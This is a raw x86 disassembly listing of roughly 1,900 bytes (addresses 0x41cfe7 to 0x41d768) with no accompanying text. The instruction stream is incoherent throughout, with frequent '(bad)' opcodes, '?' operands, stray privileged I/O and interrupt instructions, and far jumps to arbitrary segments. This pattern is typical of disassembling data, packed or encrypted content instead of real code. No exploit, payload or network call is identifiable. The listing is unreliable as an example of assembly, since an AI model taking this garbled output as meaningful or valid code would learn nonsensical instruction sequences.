  41cfe7:	test   DWORD PTR [edx+edx*1+0x15],ebp
  41cfeb:	jle    0x41cf95
  41cfed:	push   edi
  41cfee:	xchg   ebx,eax
  41cfef:	rcr    BYTE PTR [ebp-0x30b171c9],0x66
  41cff6:	jmp    0x41cfb2
  41cff8:	dec    edx
  41cff9:	mov    esi,0x565d1c74
  41cffe:	xchg   esi,eax
  41cfff:	dec    BYTE PTR [ebx+0x7a938a4b]
  41d005:	sbb    BYTE PTR [edi+0x181ec236],dh
  41d00b:	lods   eax,DWORD PTR ds:[esi]
  41d00c:	and    ah,BYTE PTR [edx-0x6a]
  41d00f:	pop    esi
  41d010:	jl     0x41cfee
  41d012:	push   ds
  41d013:	mov    al,0x36
  41d015:	mov    cl,0xf2
  41d017:	adc    DWORD PTR [ebp-0x7f],esp
  41d01a:	mov    al,ds:0x9045606b
  41d01f:	int    0xb6
  41d021:	pop    edx
  41d022:	int3   
  41d023:	mov    ebp,0x8082922e
  41d028:	jle    0x41d050
  41d02a:	stos   DWORD PTR es:[edi],eax
  41d02b:	lock rcr BYTE PTR [ecx-0x7a],0x4b
  41d030:	dec    ecx
  41d031:	test   edi,edx
  41d033:	lods   eax,DWORD PTR ds:[esi]
  41d034:	jbe    0x41d018
  41d036:	into   
  41d037:	push   ebp
  41d038:	sub    BYTE PTR [esi-0x3e787dd5],bh
  41d03e:	xchg   esp,eax
  41d03f:	or     ch,BYTE PTR [ecx]
  41d041:	fisttp QWORD PTR [eax+0x18b8875d]
  41d047:	repz mov ebp,0xec8272a0
  41d04d:	xchg   ebp,eax
  41d04e:	out    0x80,al
  41d050:	lahf   
  41d051:	push   ecx
  41d052:	std    
  41d053:	in     al,0xb9
  41d055:	xchg   ecx,eax
  41d056:	push   esp
  41d057:	shl    BYTE PTR [ebx+0x73],0xb7
  41d05b:	ret    0x980c
  41d05e:	fs push ebp
  41d060:	fwait
  41d061:	pop    ebp
  41d062:	jge    0x41d0b8
  41d064:	ins    DWORD PTR es:[edi],dx
  41d065:	adc    dh,bh
  41d067:	push   ebx
  41d068:	dec    eax
  41d069:	lods   al,BYTE PTR ds:[esi]
  41d06a:	inc    edi
  41d06b:	mov    edx,esi
  41d06d:	add    BYTE PTR ds:0xb476f01a,dl
  41d073:	jmp    0xf4ae:0x87bbed32
  41d07a:	xchg   edi,eax
  41d07b:	or     DWORD PTR [ebp-0x59a6369b],esp
  41d081:	xchg   ecx,eax
  41d082:	push   ss
  41d083:	sub    DWORD PTR [ebx],eax
  41d085:	sub    ebx,esi
  41d087:	test   DWORD PTR [esi-0x28722999],esi
  41d08d:	fs inc edx
  41d08f:	mov    DWORD PTR [edi+0x2855144e],eax
  41d095:	cmp    BYTE PTR [edi],bl
  41d097:	add    DWORD PTR [ebp-0x41c3f712],0xcf21e204
  41d0a1:	aam    0x56
  41d0a3:	or     dl,BYTE PTR [ecx]
  41d0a5:	add    dl,BYTE PTR [edi+0x7beb200e]
  41d0ab:	repz arpl WORD PTR [eax],dx
  41d0ae:	inc    edx
  41d0af:	sahf   
  41d0b0:	jo     0x41d087
  41d0b2:	sbb    ecx,edx
  41d0b4:	adc    al,0x8d
  41d0b6:	(bad)  
  41d0b7:	dec    esp
  41d0b8:	stos   BYTE PTR es:[edi],al
  41d0b9:	jecxz  0x41d0de
  41d0bb:	add    DWORD PTR [ebx-0x26],eax
  41d0be:	imul   BYTE PTR [ebx+0x31]
  41d0c1:	fs mov al,0xb4
  41d0c4:	inc    ecx
  41d0c5:	jmp    0x41d048
  41d0c7:	loope  0x41d0bd
  41d0c9:	stos   DWORD PTR es:[edi],eax
  41d0ca:	push   eax
  41d0cb:	sti    
  41d0cc:	shl    DWORD PTR [eax+0x5],0x9e
  41d0d0:	xor    al,0x15
  41d0d2:	sbb    ebp,edi
  41d0d4:	mov    dh,0x8f
  41d0d6:	jl     0x41d0a8
  41d0d8:	push   ecx
  41d0d9:	xor    al,0x4
  41d0db:	jg     0x41d150
  41d0dd:	inc    edx
  41d0de:	std    
  41d0df:	stos   BYTE PTR es:[edi],al
  41d0e0:	(bad)  
  41d0e1:	jecxz  0x41d0e5
  41d0e3:	inc    edx
  41d0e4:	stos   DWORD PTR es:[edi],eax
  41d0e5:	jecxz  0x41d0f3
  41d0e7:	sbb    eax,0x55066c62
  41d0ec:	out    dx,al
  41d0ed:	inc    esp
  41d0ee:	nop
  41d0ef:	fcomip st,st(0)
  41d0f1:	daa    
  41d0f2:	call   0x6b124890
  41d0f7:	daa    
  41d0f8:	outs   dx,DWORD PTR ds:[esi]
  41d0f9:	(bad)  
  41d0fa:	loop   0x41d0ae
  41d0fc:	mov    eax,cs:0x40008e
  41d102:	mov    ebx,0x427fad85
  41d107:	setle  BYTE PTR [edi-0x60]
  41d10b:	xor    al,0xd8
  41d10d:	sbb    ah,BYTE PTR [ebp+0x44]
  41d110:	pop    esp
  41d111:	scas   eax,DWORD PTR es:[edi]
  41d112:	div    esi
  41d114:	sti    
  41d115:	xchg   ebx,eax
  41d116:	gs stc 
  41d118:	aad    0xfc
  41d11a:	and    ax,0xab5
  41d11e:	repnz push edx
  41d120:	test   eax,0xf42b6bc
  41d125:	push   edi
  41d126:	lods   eax,DWORD PTR ds:[esi]
  41d127:	mov    ds:0xad1a4b2e,eax
  41d12c:	xor    BYTE PTR [esi-0x1d],0x38
  41d130:	(bad)  
  41d131:	hlt    
  41d132:	dec    esp
  41d133:	jg     0x41d148
  41d135:	mov    ds:0x40f89d93,eax
  41d13a:	sbb    eax,0xe2ae0516
  41d13f:	repz mov ds:0xee3146e2,al
  41d145:	sub    eax,0xa7eaaee2
  41d14a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d14b:	hlt    
  41d14c:	jb     0x41d184
  41d14e:	jmp    0x41d13e
  41d150:	outs   dx,DWORD PTR ds:[esi]
  41d151:	jge    0x41d14a
  41d153:	enter  0x3a41,0x1b
  41d157:	pop    esi
  41d158:	fld    QWORD PTR ds:0xce5eb168
  41d15e:	mov    eax,0xab781d8e
  41d163:	mov    WORD PTR [esi+ebx*8+0x0],fs
  41d167:	and    DWORD PTR [ebp+ebx*1+0x6b],ebp
  41d16b:	and    cl,BYTE PTR [ebx+ebx*2]
  41d16e:	fisttp WORD PTR [eax+0x59]
  41d171:	(bad)  
  41d173:	into   
  41d174:	mov    ss,WORD PTR [ebx+0x676dc4c2]
  41d17a:	or     ebp,esp
  41d17c:	mov    eax,ds:0x6c3f1a01
  41d181:	xor    edx,DWORD PTR [ebp-0x9]
  41d184:	std    
  41d185:	or     ch,BYTE PTR [edx]
  41d187:	jle    0x41d174
  41d189:	call   0xea890cc4
  41d18e:	cmp    eax,DWORD PTR [ecx+0x6843de3f]
  41d194:	mov    ds:0x4e5a3132,al
  41d199:	in     eax,0xf3
  41d19b:	or     ah,BYTE PTR [edi-0x1]
  41d19e:	leave  
  41d19f:	dec    eax
  41d1a0:	pop    esp
  41d1a1:	xchg   edi,eax
  41d1a2:	mov    ds:0x95569604,eax
  41d1a7:	lds    edx,FWORD PTR [ebx+eiz*2]
  41d1aa:	cli    
  41d1ab:	adc    esp,0x3f21a811
  41d1b1:	mov    ecx,0x9a0fcfaa
  41d1b6:	sub    DWORD PTR [eax],ebx
  41d1b8:	sbb    DWORD PTR [ecx],0xffffffd0
  41d1bb:	lods   eax,DWORD PTR ds:[esi]
  41d1bc:	stos   DWORD PTR es:[edi],eax
  41d1bd:	sti    
  41d1be:	inc    edi
  41d1bf:	popf   
  41d1c0:	cmp    al,0x9d
  41d1c2:	jne    0x41d19f
  41d1c4:	sahf   
  41d1c5:	retf   
  41d1c6:	enter  0x9d6c,0x77
  41d1ca:	imul   ebp,DWORD PTR [edx],0x59308329
  41d1d0:	jmp    0x3c7686b4
  41d1d5:	stos   DWORD PTR es:[edi],eax
  41d1d6:	(bad)  
  41d1d7:	in     al,dx
  41d1d8:	rcl    ebx,cl
  41d1da:	in     eax,0x5d
  41d1dc:	or     BYTE PTR [ebx-0x3f],dl
  41d1df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1e0:	outs   dx,DWORD PTR ds:[esi]
  41d1e1:	mov    ?,edx
  41d1e3:	push   ss
  41d1e4:	or     esi,eax
  41d1e6:	mov    ebp,0xedb9f4ec
  41d1eb:	fdiv   st,st(3)
  41d1ed:	push   eax
  41d1ee:	mov    BYTE PTR [edx-0x66],ah
  41d1f1:	in     eax,0xa1
  41d1f3:	test   DWORD PTR [eax-0x3],esi
  41d1f6:	adc    BYTE PTR [ecx],0x87
  41d1f9:	mov    bh,0x41
  41d1fb:	mov    eax,0xd32714f6
  41d200:	jne    0x41d1cc
  41d202:	inc    ecx
  41d203:	stc    
  41d204:	(bad)  
  41d205:	fild   WORD PTR [edx]
  41d207:	jle    0x41d23c
  41d209:	mov    ds:0xe95b43ca,al
  41d20e:	ds adc eax,0x8f24d339
  41d214:	stc    
  41d215:	(bad)  
  41d216:	fst    DWORD PTR [edi]
  41d218:	rcr    BYTE PTR [eax+esi*1],1
  41d21b:	or     bl,BYTE PTR [ebx*8-0x343ab169]
  41d222:	xor    BYTE PTR [eax*2-0x5c864245],dl
  41d229:	xchg   ecx,eax
  41d22a:	rcr    BYTE PTR [esi-0x7b57b94a],cl
  41d230:	mov    dl,0x58
  41d232:	mov    bh,0x38
  41d234:	(bad)  
  41d235:	fiadd  WORD PTR [eax+ecx*2]
  41d238:	add    cl,dh
  41d23a:	aam    0xd1
  41d23c:	inc    esp
  41d23d:	rcr    DWORD PTR [ebx+0x25],cl
  41d240:	call   0x594:0x3a067966
  41d247:	idiv   BYTE PTR [edx-0x7a7388b8]
  41d24d:	xchg   ecx,eax
  41d24e:	pop    ebx
  41d24f:	out    dx,eax
  41d250:	and    dl,ch
  41d252:	dec    ecx
  41d253:	inc    edi
  41d254:	mov    edi,0x59efb8fe
  41d259:	add    ah,cl
  41d25b:	or     BYTE PTR [ecx-0xf],bh
  41d25e:	inc    ebp
  41d25f:	jne    0x41d291
  41d261:	aam    0x19
  41d263:	jnp    0x41d1f7
  41d265:	xchg   ebx,eax
  41d266:	shl    edi,cl
  41d268:	aas    
  41d269:	cmp    DWORD PTR [esi+0x1019ae90],edi
  41d26f:	sub    esi,edi
  41d271:	lods   al,BYTE PTR ds:[esi]
  41d272:	push   ds
  41d273:	push   esi
  41d274:	pop    esi
  41d275:	mov    dh,0x71
  41d277:	fidivr WORD PTR [ecx]
  41d279:	or     al,0xa2
  41d27b:	mov    dh,BYTE PTR [edx]
  41d27d:	aad    0xb9
  41d27f:	adc    DWORD PTR [edi],0xce8b8cc
  41d285:	mov    ebx,0x866de2b6
  41d28a:	sbb    esp,esi
  41d28c:	ffreep st(2)
  41d28e:	sahf   
  41d28f:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41d291:	adc    eax,0x64edc378
  41d296:	popa   
  41d297:	xor    al,0xb1
  41d299:	dec    edx
  41d29a:	pop    ecx
  41d29b:	mov    edx,DWORD PTR [ecx-0x636cfa62]
  41d2a1:	adc    eax,eax
  41d2a3:	sub    dh,BYTE PTR gs:0xdb2d9b64
  41d2aa:	(bad)  
  41d2ac:	repz adc esp,DWORD PTR [esi-0x6c1b3491]
  41d2b3:	mov    edx,0x66749d8
  41d2b8:	call   0xe5c5:0x42f8c5b6
  41d2bf:	test   eax,0x88b17c71
  41d2c4:	ds call 0x92d11054
  41d2ca:	test   BYTE PTR [eax-0x33],bl
  41d2cd:	inc    ebp
  41d2ce:	mov    esi,0x61c9c062
  41d2d3:	pusha  
  41d2d4:	xchg   BYTE PTR [edx],dh
  41d2d6:	or     dh,BYTE PTR [edx+0x1a7b25ba]
  41d2dc:	cs dec esi
  41d2de:	push   es
  41d2df:	out    0x9a,al
  41d2e1:	or     DWORD PTR [ecx-0x76],ecx
  41d2e4:	pop    edi
  41d2e5:	outs   dx,DWORD PTR ds:[esi]
  41d2e6:	mov    dh,0x77
  41d2e8:	fimul  DWORD PTR [eax-0xd]
  41d2eb:	dec    edx
  41d2ec:	sbb    DWORD PTR [edi],edi
  41d2ee:	xchg   BYTE PTR [edx+eax*2+0x39],bl
  41d2f2:	ds dec edi
  41d2f4:	jmp    0x41d2a7
  41d2f6:	adc    DWORD PTR [edx+0x2b4a6b23],ecx
  41d2fc:	mov    ah,0xce
  41d2fe:	nop
  41d2ff:	jb     0x41d2fc
  41d301:	es sbb edx,0xffffffdc
  41d305:	stos   BYTE PTR es:[edi],al
  41d306:	xchg   edx,eax
  41d307:	jecxz  0x41d29d
  41d309:	jns    0x41d2f3
  41d30b:	lock imul eax,DWORD PTR [ebp+0x36],0xd44e6572
  41d313:	std    
  41d314:	xor    al,0xb7
  41d317:	(bad)  
  41d318:	int3   
  41d319:	bound  esi,QWORD PTR [esi-0x58]
  41d31c:	lods   al,BYTE PTR ds:[esi]
  41d31d:	cmc    
  41d31e:	xchg   ebp,eax
  41d31f:	cwde   
  41d320:	adc    ebx,DWORD PTR ds:[edi+0x3]
  41d324:	xchg   edi,eax
  41d325:	cli    
  41d326:	lea    ebx,[edi]
  41d328:	bound  eax,QWORD PTR [ecx+0x44786907]
  41d32e:	cs pop ecx
  41d330:	jbe    0x41d314
  41d332:	mov    BYTE PTR [ecx+0x15],bh
  41d335:	scas   al,BYTE PTR es:[edi]
  41d336:	into   
  41d337:	push   cs
  41d338:	in     eax,dx
  41d339:	push   0x68dc7fec
  41d33e:	iret   
  41d33f:	mov    al,0x3a
  41d341:	jbe    0x41d2f8
  41d343:	outs   dx,DWORD PTR ds:[esi]
  41d344:	cmp    al,BYTE PTR [eax+ebx*4+0x1e]
  41d348:	push   ebp
  41d349:	push   ebx
  41d34a:	jbe    0x41d32e
  41d34c:	push   esp
  41d34d:	ret    
  41d34e:	sbb    edx,ecx
  41d350:	jmp    0x27daee4f
  41d355:	sub    eax,DWORD PTR cs:[esi-0x3e4b0ef7]
  41d35c:	daa    
  41d35d:	jns    0x41d33a
  41d35f:	data16 and al,0x58
  41d362:	push   0x3702aee
  41d367:	shl    BYTE PTR [eax-0x29089e1a],cl
  41d36d:	push   es
  41d36e:	or     eax,ecx
  41d370:	dec    edx
  41d371:	(bad)  [ecx+0x1f]
  41d374:	mov    dl,0x77
  41d376:	fldenv ds:0x8c79a13c
  41d37c:	push   edi
  41d37d:	jae    0x41d304
  41d37f:	aad    0xb
  41d381:	cmp    eax,0x4187524c
  41d386:	xchg   esi,eax
  41d387:	jnp    0x41d3e9
  41d389:	mov    ebx,0xba1a7f52
  41d38e:	xor    BYTE PTR [edx+0x74922dd9],dl
  41d394:	addr16 jne 0x41d374
  41d397:	push   cs
  41d398:	outs   dx,BYTE PTR ds:[esi]
  41d399:	dec    edi
  41d39a:	mov    eax,fs
  41d39c:	add    eax,0x6368c87
  41d3a1:	pop    esp
  41d3a2:	les    edi,FWORD PTR [ecx]
  41d3a4:	lea    esp,[esi]
  41d3a6:	cmp    dl,al
  41d3a8:	xor    eax,0xc3732c59
  41d3ad:	cmc    
  41d3ae:	cmp    dh,ah
  41d3b0:	and    DWORD PTR ds:0x4c4861cc,ebp
  41d3b6:	xchg   DWORD PTR [eax+0x50],esi
  41d3b9:	jae    0x41d3bf
  41d3bb:	mov    eax,ds:0x5aa71720
  41d3c0:	and    DWORD PTR [ebx+eiz*8-0x5ac90274],esp
  41d3c7:	pushf  
  41d3c8:	jge    0x41d41f
  41d3ca:	jne    0x41d37a
  41d3cc:	xlat   BYTE PTR ds:[ebx]
  41d3cd:	fdiv   QWORD PTR [ecx]
  41d3cf:	clc    
  41d3d0:	sbb    ch,dl
  41d3d2:	sub    BYTE PTR [edx-0x1a],ch
  41d3d5:	stos   BYTE PTR es:[edi],al
  41d3d6:	pushf  
  41d3d7:	inc    edi
  41d3d8:	push   ds
  41d3d9:	mov    DWORD PTR [ebp+edi*2-0x5c5ec967],eax
  41d3e0:	imul   edi,ecx,0xffffff89
  41d3e3:	jns    0x41d3e5
  41d3e5:	sub    eax,0x9c07bfd9
  41d3ea:	out    dx,al
  41d3eb:	xchg   DWORD PTR [edx],ebx
  41d3ed:	pop    esi
  41d3ee:	xchg   BYTE PTR [ebp+0x549d375d],bl
  41d3f4:	pop    esi
  41d3f5:	dec    esi
  41d3f6:	sub    BYTE PTR [eax-0x5d4e8958],dl
  41d3fc:	imul   ebp,DWORD PTR [esi+ecx*4],0xf65e3d83
  41d403:	sub    al,0x26
  41d405:	mov    BYTE PTR [edx-0x6f],dl
  41d408:	inc    ecx
  41d409:	loop   0x41d467
  41d40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d40c:	cmp    al,0x99
  41d40e:	and    bl,ch
  41d410:	add    ch,BYTE PTR [esi+ebx*1+0x73]
  41d414:	out    0x17,eax
  41d416:	int    0xbb
  41d418:	xchg   esp,eax
  41d419:	add    eax,0x613d00bf
  41d41e:	xchg   ecx,eax
  41d41f:	pop    esi
  41d420:	xor    ah,al
  41d422:	and    dl,BYTE PTR [ebx]
  41d424:	rol    BYTE PTR [ebp+ebp*4+0x6b],0x23
  41d429:	call   0x3fd2a5e1
  41d42e:	ja     0x41d3c8
  41d430:	ja     0x41d3b7
  41d432:	addr16 dec edx
  41d434:	(bad)  [ecx+0x3f]
  41d437:	(bad)  
  41d438:	xchg   ebp,ebx
  41d43a:	mov    eax,ds:0x464b2321
  41d43f:	inc    ebx
  41d440:	inc    esp
  41d441:	push   0x1d975589
  41d446:	sti    
  41d447:	jmp    0x6c54:0x801e7f07
  41d44e:	push   ds
  41d44f:	xchg   BYTE PTR ds:0xa477d78f,cl
  41d455:	sbb    al,0x99
  41d457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d458:	cs pop ss
  41d45a:	mov    ch,0x56
  41d45c:	test   BYTE PTR [edi],al
  41d45e:	jo     0x41d4ca
  41d460:	mov    edi,0xfedcc8f
  41d465:	inc    eax
  41d466:	dec    esp
  41d467:	push   ecx
  41d468:	push   ds
  41d469:	enter  0xbb9a,0x18
  41d46d:	fnsave [ecx+0x7d]
  41d470:	mov    ch,0xa8
  41d472:	cs or  edx,edi
  41d475:	(bad)  
  41d476:	int3   
  41d477:	mov    al,0xea
  41d479:	mov    al,BYTE PTR [esi+0x3e]
  41d47c:	icebp  
  41d47d:	or     al,0x86
  41d47f:	mov    ch,dh
  41d481:	jae    0x41d49d
  41d483:	mov    bh,0xdb
  41d485:	xchg   ebx,eax
  41d486:	cli    
  41d487:	jne    0x41d4c8
  41d489:	call   0x4339:0x6f97b84b
  41d490:	or     BYTE PTR [ecx],dh
  41d492:	lahf   
  41d493:	sbb    ch,BYTE PTR [esp+ebp*4]
  41d496:	dec    edi
  41d497:	(bad)  
  41d498:	lock jmp 0x3dd9:0x65918731
  41d4a0:	pop    edx
  41d4a1:	mov    BYTE PTR [ecx],ah
  41d4a3:	pop    esi
  41d4a4:	lods   eax,DWORD PTR ss:[esi]
  41d4a6:	es dec esp
  41d4a8:	mov    esi,0x806bc733
  41d4ad:	jmp    0xf5ea1d7f
  41d4b2:	and    dh,BYTE PTR [ebp+0x3e]
  41d4b5:	jb     0x41d527
  41d4b7:	(bad)  
  41d4b8:	bound  esp,QWORD PTR [edx]
  41d4ba:	cmp    ebp,DWORD PTR [edx]
  41d4bc:	jns    0x41d52c
  41d4be:	in     al,dx
  41d4bf:	dec    eax
  41d4c0:	cmp    al,0x98
  41d4c2:	xchg   ebx,eax
  41d4c3:	out    dx,eax
  41d4c4:	rcl    DWORD PTR [edx],0x45
  41d4c7:	sub    BYTE PTR [ebp+0x76],dl
  41d4ca:	push   edi
  41d4cb:	lods   eax,DWORD PTR ds:[esi]
  41d4cc:	dec    esp
  41d4cd:	jbe    0x41d540
  41d4cf:	sahf   
  41d4d0:	pop    ds
  41d4d1:	mov    eax,DWORD PTR [eax+0x310725b1]
  41d4d7:	add    dl,cl
  41d4d9:	in     al,0x13
  41d4db:	jmp    0x41d4b5
  41d4dd:	and    edx,DWORD PTR [ebp+0x6d1f0f03]
  41d4e3:	js     0x3632de66
  41d4e9:	lock es pop ebx
  41d4ec:	aad    0x37
  41d4ee:	pop    ss
  41d4ef:	fwait
  41d4f0:	mov    bh,0x47
  41d4f2:	std    
  41d4f3:	dec    ecx
  41d4f4:	data16 adc BYTE PTR gs:[edi-0x41],bh
  41d4f9:	(bad)  
  41d4fa:	(bad)  
  41d4fc:	daa    
  41d4fd:	aaa    
  41d4fe:	sti    
  41d4ff:	jg     0x41d4c3
  41d501:	(bad)  
  41d502:	fsub   QWORD PTR [ebx+0x5ec3d483]
  41d508:	mov    ah,dl
  41d50a:	push   ds
  41d50b:	mov    bh,0x43
  41d50d:	add    BYTE PTR [ebx+0x7cd9ee6c],al
  41d513:	(bad)  
  41d514:	icebp  
  41d515:	fwait
  41d516:	stos   BYTE PTR es:[edi],al
  41d517:	adc    ebx,ecx
  41d519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d51a:	add    al,0x89
  41d51c:	mov    ebp,0x187a60e
  41d521:	in     al,dx
  41d522:	fdiv   QWORD PTR [ecx+0x39]
  41d525:	jge    0x41d570
  41d527:	fiadd  WORD PTR [esi]
  41d529:	std    
  41d52a:	inc    esi
  41d52b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d52c:	mov    bl,ch
  41d52e:	mov    bh,0x48
  41d530:	push   0xc5d7a04f
  41d535:	mov    ?,ebp
  41d537:	lods   al,BYTE PTR ds:[esi]
  41d538:	sti    
  41d539:	add    eax,0xe0df2043
  41d53e:	iret   
  41d53f:	dec    edi
  41d540:	lods   al,BYTE PTR es:[esi]
  41d542:	add    BYTE PTR [ecx+0x5a0ce417],dl
  41d548:	xchg   esi,eax
  41d549:	inc    ebx
  41d54a:	mov    esp,0xb38ab17c
  41d54f:	jg     0x41d542
  41d551:	call   0x61697f80
  41d556:	les    esi,FWORD PTR [esi+ebp*8]
  41d559:	jp     0x41d58f
  41d55b:	jno    0x41d557
  41d55d:	jns    0x41d5b4
  41d55f:	pop    esi
  41d560:	in     al,0xb7
  41d562:	cmp    BYTE PTR [ebx+0x786d51dd],ah
  41d568:	xchg   ebp,eax
  41d569:	(bad)  
  41d56a:	in     eax,0x19
  41d56c:	jno    0x41d59e
  41d56e:	shl    dl,0x7e
  41d571:	add    BYTE PTR [eax-0xbfb9654],dl
  41d577:	ret    
  41d578:	out    dx,eax
  41d579:	push   ds
  41d57a:	loope  0x41d508
  41d57c:	popf   
  41d57d:	cli    
  41d57e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d57f:	mov    esp,0x8b781496
  41d584:	sbb    eax,0xbdf1d5b3
  41d589:	scas   eax,DWORD PTR es:[edi]
  41d58a:	fisttp QWORD PTR [ebx]
  41d58c:	mov    edx,0xe16e91a4
  41d591:	and    eax,0x926b7533
  41d596:	add    DWORD PTR [edi+0x7a],eax
  41d599:	test   BYTE PTR [edi+0x53f24757],0x28
  41d5a0:	jae    0x41d592
  41d5a2:	ret    
  41d5a3:	jno    0x41d5d4
  41d5a5:	shl    bl,1
  41d5a7:	imul   esi,eax,0x6c337259
  41d5ad:	mov    ebp,cs
  41d5af:	cmp    BYTE PTR [edx+0x71],0xa4
  41d5b3:	scas   al,BYTE PTR es:[edi]
  41d5b4:	add    al,BYTE PTR [esi+0x47be2b62]
  41d5ba:	inc    ecx
  41d5bb:	pop    ebx
  41d5bc:	fimul  DWORD PTR [edi+ebp*8-0xde220a9]
  41d5c3:	or     eax,0xea7aa7d1
  41d5c8:	pop    ss
  41d5c9:	add    bh,BYTE PTR [edx+0x7f]
  41d5cc:	mov    al,ds:0x400023c3
  41d5d1:	jno    0x41d5ed
  41d5d3:	add    bh,BYTE PTR [edi-0x2f]
  41d5d6:	cmp    esp,DWORD PTR [ecx]
  41d5d8:	mov    esp,0xc811296b
  41d5dd:	xchg   edi,eax
  41d5de:	add    DWORD PTR [esi-0x12220857],ebx
  41d5e4:	mov    dl,0x3b
  41d5e6:	test   dl,0xe3
  41d5e9:	cmp    bh,BYTE PTR [ebx-0x37]
  41d5ec:	add    al,0x77
  41d5ee:	outs   dx,BYTE PTR ds:[esi]
  41d5ef:	mov    eax,ds:0x45898521
  41d5f4:	icebp  
  41d5f5:	xchg   edx,eax
  41d5f6:	outs   dx,BYTE PTR ds:[esi]
  41d5f7:	mov    dl,0xa
  41d5f9:	pop    es
  41d5fa:	enter  0x9021,0x5d
  41d5fe:	ror    BYTE PTR [ecx+0x4798eb5],1
  41d604:	jp     0x41d596
  41d606:	add    bh,al
  41d608:	and    ebp,eax
  41d60a:	fld    QWORD PTR [edx+0xf8a9506]
  41d610:	adc    BYTE PTR [ebx+0x662a1b7e],bl
  41d616:	ds iret 
  41d618:	push   esi
  41d619:	or     eax,0x2a53a969
  41d61e:	scas   eax,DWORD PTR es:[edi]
  41d61f:	in     eax,0xa
  41d621:	shl    BYTE PTR [esi+ebx*4+0x6d],0xa4
  41d626:	lock and al,0x7e
  41d629:	sub    DWORD PTR [ebp+edx*1+0x39832d45],esp
  41d630:	(bad)  
  41d631:	fstp   QWORD PTR [ecx]
  41d633:	pusha  
  41d634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d635:	xlat   BYTE PTR ds:[ebx]
  41d636:	iret   
  41d637:	push   esp
  41d638:	ins    DWORD PTR es:[edi],dx
  41d639:	shl    BYTE PTR [edi+0x3],0x55
  41d63d:	or     DWORD PTR [ecx-0x62c040c7],ecx
  41d643:	fsub   DWORD PTR [eax]
  41d645:	or     esi,DWORD PTR [ecx-0x31]
  41d648:	and    BYTE PTR [esi+0xd961caa],bh
  41d64e:	adc    BYTE PTR [edx-0x711e92d9],cl
  41d654:	ret    0x2a9c
  41d657:	dec    ebx
  41d658:	shl    BYTE PTR [ecx-0xcb8d4bf],cl
  41d65e:	div    DWORD PTR [edi]
  41d660:	push   es
  41d661:	xor    BYTE PTR [edi-0x1e684118],dh
  41d667:	mov    ds,esi
  41d669:	and    BYTE PTR [edi],bl
  41d66b:	jns    0x41d66f
  41d66d:	test   al,0xa4
  41d66f:	frstor [edx-0x4c44fcff]
  41d675:	out    0x3c,al
  41d677:	loop   0x41d67b
  41d679:	mov    cl,0x23
  41d67b:	mov    dh,0x66
  41d67d:	push   ss
  41d67e:	out    dx,eax
  41d67f:	retf   
  41d680:	call   0x48d1:0x9c6633d5
  41d687:	lea    esi,[edx-0x5282b80b]
  41d68d:	cwde   
  41d68e:	inc    ebx
  41d68f:	xchg   ebp,eax
  41d690:	xlat   BYTE PTR ds:[ebx]
  41d691:	enter  0xad55,0x65
  41d695:	sti    
  41d696:	fs loope 0x41d637
  41d699:	mov    eax,0xd82cb770
  41d69e:	add    bh,dl
  41d6a0:	mov    ecx,0x96420878
  41d6a5:	and    edx,DWORD PTR [ecx-0x7d]
  41d6a8:	sub    al,0x21
  41d6aa:	xchg   esp,eax
  41d6ab:	push   ebp
  41d6ac:	leave  
  41d6ad:	mov    eax,ds:0xa8ca09c3
  41d6b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6b3:	mov    ebp,0xd01e1f1e
  41d6b8:	cld    
  41d6b9:	and    dl,BYTE PTR [ebx+0x71]
  41d6bc:	mov    bl,0x43
  41d6be:	and    esi,ebx
  41d6c0:	shl    DWORD PTR [edi-0x71cde341],0x16
  41d6c7:	sar    BYTE PTR [ebx],cl
  41d6c9:	scas   eax,DWORD PTR es:[edi]
  41d6ca:	rol    DWORD PTR [eax+0x3a],0xaa
  41d6ce:	dec    edx
  41d6cf:	push   ecx
  41d6d0:	sub    DWORD PTR [esi],ecx
  41d6d2:	shl    BYTE PTR [esi+ecx*8+0x16728cd3],1
  41d6d9:	sbb    ebp,eax
  41d6db:	add    bl,BYTE PTR [edi-0x1c]
  41d6de:	xchg   edi,eax
  41d6df:	mov    ecx,0x3cb40d84
  41d6e4:	stos   DWORD PTR es:[edi],eax
  41d6e5:	setne  BYTE PTR [eax-0x1d]
  41d6e9:	fldenv [edi-0x1f73fa50]
  41d6ef:	xchg   edx,eax
  41d6f0:	mov    al,ds:0x9b89af53
  41d6f5:	inc    DWORD PTR [esi-0x445508b8]
  41d6fb:	sub    DWORD PTR [edx],edi
  41d6fd:	cld    
  41d6fe:	in     al,0x5f
  41d700:	js     0x41d6f5
  41d702:	cwde   
  41d703:	and    DWORD PTR [edx+eax*2+0x56f283e1],eax
  41d70a:	sub    BYTE PTR [ebp-0x432bd66e],dl
  41d710:	adc    DWORD PTR [ebp-0x5e6346bd],esi
  41d716:	push   ds
  41d717:	jg     0x41d6a8
  41d719:	(bad)  
  41d71a:	repnz xlat BYTE PTR ds:[ebx]
  41d71c:	sbb    BYTE PTR [bx-0x45b2],bh
  41d721:	fidiv  DWORD PTR ds:0x2b20b13
  41d727:	sbb    eax,0x396a5c9f
  41d72c:	lahf   
  41d72d:	cmovno edx,DWORD PTR [ebp-0x5]
  41d731:	inc    ebp
  41d732:	jmp    0xfe42e579
  41d737:	adc    DWORD PTR [ecx],esp
  41d739:	int    0x79
  41d73b:	(bad)  [ebx]
  41d73d:	pop    edi
  41d73e:	test   DWORD PTR ds:0xc6887d66,0x2a202137
  41d748:	mov    ds:0x597070f8,eax
  41d74d:	jmp    0x41d6d6
  41d74f:	add    DWORD PTR [ebx+0x33],esi
  41d752:	add    DWORD PTR [ecx],ecx
  41d754:	test   DWORD PTR [edx+0x4947d74e],edx
  41d75a:	pop    edi
  41d75b:	stos   DWORD PTR es:[edi],eax
  41d75c:	cmp    eax,0xde3e79a4
  41d761:	xor    ecx,DWORD PTR [esi+0x12]
  41d764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d765:	jb     0x41d6e9
  41d767:	inc    ebx
  41d768:	into   
